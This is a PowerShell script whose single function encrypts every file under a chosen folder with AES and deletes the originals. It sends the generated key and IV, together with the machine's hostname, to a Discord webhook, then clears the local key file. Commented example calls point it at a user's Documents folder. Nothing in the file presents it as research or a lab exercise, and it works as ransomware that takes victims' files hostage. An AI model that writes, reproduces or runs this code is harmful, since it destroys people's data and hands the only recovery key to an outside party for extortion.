function E-D {
    param (
        [Parameter(Mandatory=$true, ParameterSetName="Encrypt")]
        [switch]$e,

        [Parameter(Mandatory=$true, ParameterSetName="Decrypt")]
        [switch]$d,

        [Parameter(Mandatory=$true)]
        [string]$p,

        [Parameter(Mandatory=$true, ParameterSetName="Encrypt")]
        [string]$wh
    )

    function SendToDiscord($webhook, $message, $hostname) {
        $body = @{
            content = "**Hostname:** $hostname `n**Key:** $message"
        } | ConvertTo-Json

        Invoke-RestMethod -Uri $webhook -Method POST -Body $body -ContentType 'application/json'
    }

    $hostname = [System.Environment]::MachineName

    function EncryptFile($inputFile, $outputFile, $aes) {
        $aesEncryptor = $aes.CreateEncryptor()

        $bytesToBeEncrypted = [System.IO.File]::ReadAllBytes($inputFile)
        $bytesEncrypted = $aesEncryptor.TransformFinalBlock($bytesToBeEncrypted, 0, $bytesToBeEncrypted.Length)

        [System.IO.File]::WriteAllBytes($outputFile, $bytesEncrypted)
        Remove-Item $inputFile
    }

    function DecryptFile($inputFile, $outputFile, $aes) {
        $aesDecryptor = $aes.CreateDecryptor()

        $bytesToBeDecrypted = [System.IO.File]::ReadAllBytes($inputFile)
        $bytesDecrypted = $aesDecryptor.TransformFinalBlock($bytesToBeDecrypted, 0, $bytesToBeDecrypted.Length)

        [System.IO.File]::WriteAllBytes($outputFile, $bytesDecrypted)
        Remove-Item $inputFile
    }

    $key = New-Object byte[] 32
    $iv = New-Object byte[] 16
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider

    if ($e) {
        $aes.GenerateKey()
        $aes.GenerateIV()
        $key = $aes.Key
        $iv = $aes.IV

        $passwordText = [Convert]::ToBase64String($key) + "|" + [Convert]::ToBase64String($iv)
        Set-Content -Path "$p\key.txt" -Value $passwordText

        SendToDiscord $wh $passwordText $hostname

        Clear-Content "$p\key.txt"

        Get-ChildItem -Path $p -Recurse -File | ForEach-Object {
            EncryptFile $_.FullName ($_.FullName + ".enc") $aes
        }
    }

    if ($d) {
        $keyPath = "$p\key.txt"
        if (Test-Path $keyPath) {
            $passwordText = Get-Content $keyPath
            $key = [Convert]::FromBase64String($passwordText.Split("|")[0])
            $iv = [Convert]::FromBase64String($passwordText.Split("|")[1])

            $aes.Key = $key
            $aes.IV = $iv

            Get-ChildItem -Path $p -Recurse -File | Where-Object { $_.Extension -eq ".enc" } | ForEach-Object {
                DecryptFile $_.FullName ($_.FullName -replace ".enc$", "") $aes
            }
        } else {
            Write-Host "The key file is not located in the directory. Aborting decryption."
        }
    }
}

#E-D -e -p "C:\Users\$env:USERNAME\Documents\test\" -wh "YOUR WEBHOOK HERE"

#E-D -d -p "C:\Users\$env:USERNAME\Documents\test\"
